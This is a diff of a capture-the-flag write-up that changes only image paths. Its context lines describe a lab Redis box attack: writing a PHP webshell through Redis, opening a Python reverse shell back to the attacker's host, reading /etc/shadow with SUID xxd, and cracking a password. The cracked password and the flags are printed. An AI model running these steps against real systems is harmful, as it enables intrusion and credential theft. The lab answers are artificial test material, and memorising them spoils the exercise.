@@ -69,7 +69,7 @@ from our Recon, we know that it is running a web server which Commonly stores it
 
 command: ```redis-cli <target_ip>```
 
-![image](./res/redis_cli.png)
+![image](/posts/res/redis_cli.png)
 
 Next, we'll specify the dbfilename with a filename of our selection. In this instance, we're designating it as "shell.php." Since it carries the ".php" extension, it's clear that we intend to insert PHP code into this file for execution.
 
@@ -81,19 +81,19 @@ command: ```config set dir /var/www/html```</br>
 with our RCE script ready we can hesd over to the path on our server
 ```http://<machine_ip>/shell.php?cmd=id```
 
-![image](./res/id.png)
+![image](/posts/res/id.png)
 
 Now we have our webshell, It's time to establish a reverse shell connection to the target machine.
 
 first of all we must set up a netcat listener 
-![image](./res/nc.png)
+![image](/posts/res/nc.png)
 
 run this reverse shell using our webshell
 
 ```http://<machine_ip>/shell.php?cmd=python -c ‘import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“<local_ip>”,3030));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(“/bin/sh”)’```
 
 now we have our reverse shell.
-![image](./res/rev.png)
+![image](/posts/res/rev.png)
 
 lets upgrade to get a better and  stable shell
 
@@ -104,7 +104,7 @@ lets upgrade to get a better and  stable shell
 
 Going over to the home directory we list all files and folder, that got our first flag.
 
-![image](./res/flag.png)
+![image](/posts/res/flag.png)
 
 flag: ``` thm{red1s_rce_w1thout_credent1als} ```</br>
 
@@ -121,7 +121,7 @@ command:```find / -perm -u=s -type f 2>/dev/null```
  *  -type f restricts the search to files only.
  *   2>/dev/null is added to suppress any error messages.
 
-![image](./res/bin.png)
+![image](/posts/res/bin.png)
 
 after some few seconds we can see our result /usr/bin/xxd looks vulnerable so let's check out GTFObins.
   from my discovery i can see that the with this binary, we can only read files as root.
@@ -129,11 +129,11 @@ after some few seconds we can see our result /usr/bin/xxd looks vulnerable so le
   Excellent! Now Let’s try this to read the /etc/shadow file to find the users password. 
  command: ```/usr/bin/xxd /etc/shadow | xxd -r```</br>
 
-![image](./res/shadow.png)
+![image](/posts/res/shadow.png)
 
  now we have successfully read the /etc/shadow file we can see that a user Vianka has a password hash on the machine. lets save that hash to a txt file and try cracking it with john.</br>
  command:```john hash.txt --wordlist=<path_to_Word_list>rockyou.txt```
-![image](./res/pass.png)
+![image](/posts/res/pass.png)
 password ```beautiful1```</br>
 
  we now have our password for the user vianka. lets attempts to login
@@ -142,10 +142,10 @@ password ```beautiful1```</br>
 
  Let’s check what sudo privileges we have with sudo -l
 
- ![image](./res/su.png)
+ ![image](/posts/res/su.png)
 
  Great news! We now possess sudo privileges. To elevate our privileges, I'll execute the command `sudo su` and retrieve the `root.txt` file!</br>
- ![image](./res/root.png)
+ ![image](/posts/res/root.png)
 
 
 Root Flag:```thm{xxd_pr1v_escalat1on}```
